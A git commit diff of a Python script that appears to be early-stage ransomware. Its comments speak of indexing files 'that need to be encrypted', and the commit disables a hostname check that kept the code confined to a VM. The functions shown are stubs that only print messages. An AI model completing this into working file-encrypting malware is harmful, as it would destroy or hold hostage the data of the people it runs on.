328d6c7f1770462c1c5b1af05ff13828efb2641f
shad0wcrawl3r <ashwinbelbase@gmail.com>
2021-04-30 20:34:39 +0545

    Shifting to docker

--- main.py
+++ main.py
@@ -7,32 +7,46 @@ from socket import gethostname
 from platform import system
 
 # the following line prevents the code from running inside my machine
-if gethostname() != 'debian':
-    print("The code is supposed to be run inside of a VM you dimwit.")
-    exit()
+#temporary Bypass for testing of file listing and indexing. DO not comment this line once shuitl.move() is used
+
+#######################################################################################################
+# if gethostname() != 'debian':
+#     print("The code is supposed to be run inside of a VM you dimwit.")
+#     exit()
+#######################################################################################################
+
+
+FILETYPES = ['/**/*.test1','/**/*.test2']
+
+def get_files_from_windows():
+    print("Working on it")
+
+
+def get_files_from_mac():
+    print("MAC OS Detected. No use running this :?")
 
 
 def get_file_index():
     print("Linux Detected")
 
-def getOS():
+    #on Linux we start with the root directory so no need for a basepath
+
+
+def main():
     # to detect what OS the system is running
     sysn = system()
-    # Linux = 'Linux'
-    # possible return values from system() function
+
     if sysn == 'Linux':
         get_file_index()
-
     elif sysn == 'Win':  # dont know the output
-        # get_files_from_windows()
+        get_files_from_windows()
         pass
-
     elif sysn == 'MacOS':  # dont know the output
-        # get_files_from_mac()
-        # pass
+        get_files_from_mac()
         # never used a MAC so dont know how to get files from this thing.
-        print("MAC OS Detected. No use running this :?")
+
 
 # lets first index the files that need to be encrypted.
 
-
+if __name__=='__main__':
+    main()
